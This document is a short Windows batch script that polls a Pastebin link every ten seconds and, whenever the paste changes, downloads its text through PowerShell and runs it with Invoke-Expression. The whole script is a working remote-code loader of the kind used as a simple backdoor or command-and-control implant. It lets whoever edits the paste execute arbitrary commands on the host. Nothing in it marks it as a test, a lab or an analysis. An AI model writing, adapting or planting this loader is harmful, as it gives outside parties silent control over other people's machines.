@echo off
setlocal enabledelayedexpansion
set "raw_link=Pastebin_URL"
if exist hash.txt (
set /p previous_hash=<"hash.txt"
) else (
set "previous_hash="
)

:monitor_loop
echo Retrieving text from Pastebin...
powershell -Command "Invoke-RestMethod -Uri '%raw_link%' | ForEach-Object { $_ } | Out-File -FilePath temp.txt -Encoding UTF8"

powershell -Command "$hash = Get-FileHash -Path 'temp.txt' -Algorithm SHA256; echo $hash.Hash" > hash.txt
set /p current_hash=<hash.txt
if "%current_hash%" NEQ "%previous_hash%" (
  echo Executing code...
  powershell -Command "Get-Content temp.txt | Invoke-Expression"

  set "previous_hash=%current_hash%"
)

del temp.txt
timeout /t 10 /nobreak >nul

goto monitor_loop